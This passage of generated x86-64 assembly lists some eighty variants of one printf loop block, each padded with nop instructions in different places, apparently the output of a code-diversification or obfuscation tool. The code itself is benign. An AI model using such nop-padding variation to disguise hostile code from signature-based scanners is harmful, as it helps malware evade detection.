.Lmain_win3_var37:
	popq	%rax
	cmpl	$0, %eax
	nop
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 38
.Lmain_win3_var38:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 39
.Lmain_win3_var39:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 40
.Lmain_win3_var40:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 41
.Lmain_win3_var41:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 42
.Lmain_win3_var42:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 43
.Lmain_win3_var43:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 44
.Lmain_win3_var44:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 45
.Lmain_win3_var45:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
	nop
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 46
.Lmain_win3_var46:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 47
.Lmain_win3_var47:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 48
.Lmain_win3_var48:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 49
.Lmain_win3_var49:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 50
.Lmain_win3_var50:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 51
.Lmain_win3_var51:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 52
.Lmain_win3_var52:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 53
.Lmain_win3_var53:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 54
.Lmain_win3_var54:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 55
.Lmain_win3_var55:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 56
.Lmain_win3_var56:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 57
.Lmain_win3_var57:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 58
.Lmain_win3_var58:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 59
.Lmain_win3_var59:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 60
.Lmain_win3_var60:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 61
.Lmain_win3_var61:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 62
.Lmain_win3_var62:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 63
.Lmain_win3_var63:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 64
.Lmain_win3_var64:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 65
.Lmain_win3_var65:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 66
.Lmain_win3_var66:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 67
.Lmain_win3_var67:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 68
.Lmain_win3_var68:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 69
.Lmain_win3_var69:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 70
.Lmain_win3_var70:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 71
.Lmain_win3_var71:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 72
.Lmain_win3_var72:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 73
.Lmain_win3_var73:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 74
.Lmain_win3_var74:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 75
.Lmain_win3_var75:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 76
.Lmain_win3_var76:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 77
.Lmain_win3_var77:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 78
.Lmain_win3_var78:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 79
.Lmain_win3_var79:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 80
.Lmain_win3_var80:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 81
.Lmain_win3_var81:
	popq	%rax
	nop
	nop
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 82
.Lmain_win3_var82:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 83
.Lmain_win3_var83:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 84
.Lmain_win3_var84:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 85
.Lmain_win3_var85:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 86
.Lmain_win3_var86:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 87
.Lmain_win3_var87:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 88
.Lmain_win3_var88:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	nop
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 89
.Lmain_win3_var89:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 90
.Lmain_win3_var90:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 91
.Lmain_win3_var91:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	nop
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 92
.Lmain_win3_var92:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 93
.Lmain_win3_var93:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 94
.Lmain_win3_var94:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 95
.Lmain_win3_var95:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 96
.Lmain_win3_var96:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 97
.Lmain_win3_var97:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 98
.Lmain_win3_var98:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 99
.Lmain_win3_var99:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 100
.Lmain_win3_var100:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 101
.Lmain_win3_var101:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 102
.Lmain_win3_var102:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 103
.Lmain_win3_var103:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 104
.Lmain_win3_var104:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 105
.Lmain_win3_var105:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 106
.Lmain_win3_var106:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 107
.Lmain_win3_var107:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 108
.Lmain_win3_var108:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 109
.Lmain_win3_var109:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 110
.Lmain_win3_var110:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 111
.Lmain_win3_var111:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 112
.Lmain_win3_var112:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 113
.Lmain_win3_var113:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 114
.Lmain_win3_var114:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 115
.Lmain_win3_var115:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 116
.Lmain_win3_var116:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 117
.Lmain_win3_var117:
	popq	%rax
	nop
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 118
.Lmain_win3_var118:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 119
.Lmain_win3_var119:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 120
